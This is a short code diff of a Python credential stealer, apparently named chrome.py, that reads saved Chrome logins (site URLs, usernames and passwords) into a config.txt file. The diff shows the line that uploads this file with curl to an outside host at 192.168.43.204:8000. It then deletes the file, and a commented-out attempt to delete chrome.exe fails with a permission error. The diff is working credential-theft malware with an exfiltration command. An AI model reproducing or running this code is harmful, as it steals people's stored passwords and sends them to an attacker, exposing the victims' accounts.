@@ -6,6 +6,7 @@ import base64
 import sqlite3
 import shutil
 from datetime import timezone, datetime, timedelta
+from sys import argv
 
 #3rd party modules
 import win32crypt
@@ -80,6 +81,7 @@ def main():
                 o.write(site_url + '\n')
                 o.write(username + '\n')
                 o.write(password + '\n') 
+            
         else:
             continue
         if date_created:
@@ -94,7 +96,15 @@ def main():
 
     os.system("curl http://192.168.43.204:8000 --upload-file C:/Users/" + uname + "/config.txt")
 
-    os.system("del C:/Users/" + uname + "/config.txt")
+    os.remove("C:/Users/" + uname + "/config.txt")
+
+    #os.remove("chrome.exe") 
+    #Traceback (most recent call last):
+    #File "chrome.py", line 105, in <module>
+    #File "chrome.py", line 101, in main
+    #PermissionError: [WinError 5] Access is denied: 'chrome.exe'
+
+
 if __name__ == "__main__":
     main()
 
